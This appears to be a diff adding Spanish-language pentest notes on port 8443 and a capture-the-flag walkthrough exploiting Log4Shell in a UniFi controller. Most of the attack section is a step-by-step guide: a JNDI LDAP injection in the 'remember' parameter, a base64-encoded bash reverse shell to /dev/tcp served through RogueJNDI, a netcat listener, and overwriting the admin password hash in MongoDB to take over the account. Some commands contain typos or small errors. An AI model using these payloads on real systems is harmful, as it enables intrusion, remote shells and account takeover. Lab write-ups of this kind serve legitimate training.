@@ -1,0 +1,248 @@
+📌 Es un puerto alternativo para HTTPS. No es el estándar (ese es el 443), pero se usa mucho para:
+
+    🛠️ Paneles de administración
+    📦 Aplicaciones web internas
+    🐱 Servidores como Apache Tomcat
+    🔧 Consolas de gestión (firewalls, appliances, routers)
+
+    Normalmente indica:
+
+        🔐 Servicio web con TLS (HTTPS) pero en puerto no estándar.
+
+⚙️ ¿Por qué usar 8443 en vez de 443?
+
+    Razones comunes:
+
+        · El 443 ya está ocupado
+        · Separar aplicación principal de panel admin
+        · Configuración por defecto de algunos servidores (ej: Tomcat)
+        · Entornos de pruebas
+
+🧪 En pentesting
+
+    Si el 8443 está abierto:
+
+        1️⃣ Acceder desde navegador:
+
+            https://IP:8443
+
+        2️⃣ Identificar el servicio:
+
+            nmap -p 8443 -sV IP
+
+        3️⃣ Revisar certificado:
+
+            nmap -p 8443 --script ssl-cert IP
+
+🔐 Riesgos comunes
+
+    Dependen del servicio real:
+
+        · Panel admin expuesto
+        · Consola de gestión sin MFA
+        · Tomcat manager vulnerable
+        · Versiones TLS débiles
+
+    Muchas veces el 8443 es más interesante que el 443 porque suele alojar paneles internos mal protegidos.
+
+🎯 Ejemplo de uso 
+
+    Iniciar sesión con cualquier usuario y contraseña
+
+        https://<IP>:8443/manage/account/login?redirect=%2Fmanage
+
+    Con la heramienta BurpSuite configuramos lo siguiente: 
+
+        Proxy / HTTP History 
+
+        ver petición (POST) > Parámetro "remember" 
+
+    Configuración Listener
+
+        sudo tcpdump -i tun0 puerto 389
+
+        Donde: 
+
+            · Captura y analiza los paquetes de red -> tcpdump
+            · Especifica la interfaz de red que va a escuchar -> -i tun0
+            · Captura el tráfico del puerto 389, el cual es usado en LDAP
+	
+    ip a show tun0 (averiguar la ip de nuestra máquina local) 
+	
+    Con la herramienta BurpSuite de nuevo:
+
+        · Dentro de la variable "remember" en la pestaña de Repeater 
+        
+            "${jndi:ldap://<IP_LOCAL>/<SEND_USER>}",
+
+        · Send
+        · Dará error
+
+💣 Explotar la máquina víctima
+
+    Herramientas necesarias
+
+        1️⃣ Instalar openjdk-11-jdk
+
+            sudo apt install openjdk-11-jdk
+            java --versión 
+
+        2️⃣ Instalar maven	
+
+            sudo apt-get install maven
+            mvn -v
+
+        3️⃣ Instalar RogueJNDI
+
+            git clone https://github.com/veracode-research/rogue-jndi 
+            compilar y empaquetar proyecto > mvn package 
+			
+    La herramienta RogueJNDI no viene con un payload, por lo que crearemos una personalizada con reverse shell
+	
+    Nueva terminal
+    
+        echo 'bash -c “bash -i >/dev/tcp/<IP_USER>/4444 0>&1”' | base64
+
+        Donde: 
+
+            · Ejecuta el siguiente comando > bash -c
+            · Empieza una bash interactiva > bash -i
+            · Redirige la salida de la shell a la conexión TCP con esta dirección > >/dev/tcp/<IP_LOCAL>
+            · Redirige la entrada al mismo lugar que la salida > 0>&1
+            · Puerto al que el reverse shell se conectará > 4444
+            · Comando codificado en texto base64 > base64
+
+    Devuelve hash codificado en base64	
+		
+    Con la herrmaienta RogueJNDI
+
+        Se ejecuta el payload con el objetivo de buscar JNDI, y devolverá con el payload del reverse shell
+
+            java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,<HASH>}|{base64,-d}|{bash,-i}" --hostname "<IP_LOCAL>"
+
+            Donde: 
+
+                · Ejecuta un fichero JRE > java -jar
+                · Comando que se ejecuta > --command
+                · Ejecutar el siguiente comando en la nueva shell > bash -c 
+                · Payload obtenido > {echo,<HASH>}
+                · Descodificar el base64 > {base64,-d}
+                · Ejecutar comando en una shell interactiva > {base64,-i}
+
+    Obtendremos términos como WebSphere2, Tomcat y Groovy. Estas son herramientas y frameworks para interactuar con el servidor LDAP.
+        
+    Necesitamos encontrar el que usa UniFi. Generalmente utiliza Apache Tomcat
+        
+    Ejecutamos un listener (en la misma ruta donde está RogueJNDI)
+
+        nc-lvp 4444
+	
+    Con BurpSuite:
+
+        Dentro de la variable "remember" en la pestaña de Repeater
+        
+            ${jndi:ldap://10.10.14.66:1389/o=tomcat
+
+            Donde: 
+
+                · Sintaxis que será evaluada por Log4j > ${...}
+                · Usar JNDI, la API de Java para nombrar y listar servicios > jndi
+                · Protocolo usado > ldap: 
+                · Entrada LDAP que se está buscando > o=tomcat
+
+        send	
+
+        Nos devuelve error, pero en el listener nos saldrá lo siguiente y podremos interacturar en ella: 
+
+            connect to ....
+
+    Ejecutamos una shell bash para estabilizar la shell > script /dev/null -c bash
+		
+    Navegamos y obtenemos la user flag
+
+🔓 Escalada de privilegios
+
+    Al ser un framework, buscar en google si tiene una base de datos. En este caso tiene MongoDB.
+
+        Comprobar si hay algún proceso mongo
+        
+            ps aux | grep mongo
+
+            Donde: 
+											
+                · Muestra la información sobre procesos corriendo > ps
+                · Muestra procesos de todos los usuarios > a 
+                · Muestra más detalle de cada proceso > u
+                · Incluye procesos backgrounds > x
+                · Muestra solo los resultados que contenga la palabra que introducimos > grep
+							
+        Ruta 
+        
+            /usr/lib/unifi/data/db
+																																
+        Conectarse 
+        
+            mongo --port 27117
+
+        Mostrar bases de datos 
+        
+            show dbs
+
+        Usar una base de datos 
+        
+            use <DATABASE>
+
+        Mostrar colecciones (tablas)
+        
+            show collections 
+
+        Mostrar el contenido 
+
+            db.<DATABASE>.findOne()
+            db.<DATABASE>.find()
+
+        Lista los datos de los uduarios
+        
+            db.<COLLECTION>.find().pretty()
+
+        Para modificar la contraseña usamos el siguiente comando
+        
+            db.<COLLECTION>.update
+	            (
+                    { name: "<USER>" },
+			          {
+						$set: {
+						  x_shadow: "<NEW_PASS>",
+						  last_site_name: "default"
+				    	  }
+				      } 
+        		)
+
+        Comprobar que se ha modificado correctamente
+        
+            db.<COLLECTION>.findOne()
+		
+        Volver a convertirla en SHA512
+        
+            mkpasswd -m sha-512 <NEW_PASS> 
+
+        Volvemos a modificar la contraseña usamos el siguiente comando
+        
+            db.<COLLECTION>.update
+		        (
+				    { name: "<USER>" },
+					   {
+						$set: {
+						    x_shadow: "<NEW_PASS_SHA512>",
+							last_site_name: "default"
+							}
+					}
+				)
+		
+        Comprobar que se ha modificado correctamente > db.<COLLECTION>.findOne()
+
+        exit 
+
+    Loguearse con ese usuario y contraseña en la web
+	
+    Con el usuario y contraseña, loguearse con SSH
